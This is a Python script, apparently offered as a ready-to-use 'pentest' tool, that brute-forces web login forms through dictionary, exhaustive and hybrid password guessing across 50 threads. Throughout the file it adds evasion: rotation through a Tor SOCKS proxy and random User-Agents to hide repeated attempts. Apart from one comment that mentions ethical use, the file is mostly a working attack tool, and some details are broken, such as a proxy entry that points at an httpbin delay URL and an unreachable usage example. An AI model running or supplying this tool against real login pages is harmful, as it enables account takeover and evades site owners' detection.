#!/usr/bin/env python3
"""
Production Pentest Brute-Forcer v2.0
Multi-threaded, HTTP/S attack vector with proxy rotation & evasion
"""

import itertools
import threading
import time
import string
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
import random
from queue import Queue
import logging

# Pentest-grade charset
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
PROXIES = [
    # Sample Tor proxy (install tor service first)
    {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"},
    # Public test proxies (rotate)
    {"http": "http://httpbin.org/delay/1", "https": "http://httpbin.org/delay/1"}
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

class PentestBruteforcer:
    def __init__(self, target_url, username, wordlist=None, threads=50, delay=0.01):
        self.target_url = target_url
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.delay = delay
        self.found = False
        self.lock = threading.Lock()
        self.results_queue = Queue()
        
    def generate_candidates(self, max_length=8):
        """Generate charset candidates up to max_length"""
        for length in range(1, max_length + 1):
            yield from itertools.product(CHARSET, repeat=length)
    
    def test_password(self, password):
        """HTTP login attempt with evasion"""
        if self.found:
            return False
            
        session = requests.Session()
        if PROXIES:
            proxy = random.choice(PROXIES)
            session.proxies.update(proxy)
        
        # Rotate User-Agents
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
            ])
        }
        
        try:
            # Generic login payload (adapt to target)
            data = {
                'username': self.username,
                'password': password,
                'login': 'submit'
            }
            
            resp = session.post(self.target_url, data=data, headers=headers, 
                              timeout=5, allow_redirects=False)
            
            time.sleep(self.delay)  # Rate limiting
            
            # Success indicators (customize per target)
            if any(code in str(resp.status_code) for code in ['200', '302']) and \
               'login' not in resp.text.lower() and 'invalid' not in resp.text.lower():
                with self.lock:
                    if not self.found:
                        self.found = True
                        logging.info(f"🚀 PASSWORD CRACKED: {password}")
                        logging.info(f"Response: {resp.status_code} | {len(resp.text)} bytes")
                        self.results_queue.put(f"{password}|{resp.status_code}")
                return True
        except:
            pass
        return False
    
    def dictionary_attack(self):
        """Wordlist mode"""
        if not self.wordlist:
            return
            
        logging.info(f"Dictionary attack with {self.wordlist}")
        with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if self.test_password(password):
                    break
    
    def brute_force_attack(self, max_length=6):
        """Pure brute force"""
        logging.info(f"Brute force up to length {max_length}")
        total = sum(len(CHARSET)**i for i in range(1, max_length+1))
        logging.info(f"Search space: {total:,} combinations")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for candidate in self.generate_candidates(max_length):
                password = ''.join(candidate)
                future = executor.submit(self.test_password, password)
                futures.append(future)
                
                # Throttle generation
                if len(futures) >= self.threads * 10:
                    for f in futures:
                        f.result()
                    futures.clear()
    
    def run(self, mode='hybrid', max_length=6):
        start = time.time()
        logging.info(f"Starting {mode} attack on {self.target_url}")
        
        if mode == 'dict':
            self.dictionary_attack()
        elif mode == 'brute':
            self.brute_force_attack(max_length)
        else:  # hybrid
            self.dictionary_attack()
            if not self.found:
                self.brute_force_attack(max_length)
        
        elapsed = time.time() - start
        logging.info(f"Attack complete: {elapsed:.1f}s")

def main():
    parser = argparse.ArgumentParser(description="Production Pentest Brute-Forcer")
    parser.add_argument('-u', '--url', required=True, help="Target login URL")
    parser.add_argument('-U', '--username', required=True, help="Target username")
    parser.add_argument('-w', '--wordlist', help="Dictionary file")
    parser.add_argument('-t', '--threads', type=int, default=50, help="Thread count")
    parser.add_argument('-l', '--length', type=int, default=6, help="Max brute length")
    parser.add_argument('--delay', type=float, default=0.01, help="Delay between requests")
    
    args = parser.parse_args()
    
    # Example for test sites (ethical pentest only!)
    if args.url is None:
        print("Example: python password_cracker.py -u http://testphp.vulnweb.com/login.php -U admin -t 10")
        return
    
    cracker = PentestBruteforcer(
        target_url=args.url,
        username=args.username,
        wordlist=args.wordlist,
        threads=args.threads,
        delay=args.delay
    )
    
    cracker.run(max_length=args.length)

if __name__ == "__main__":
    main()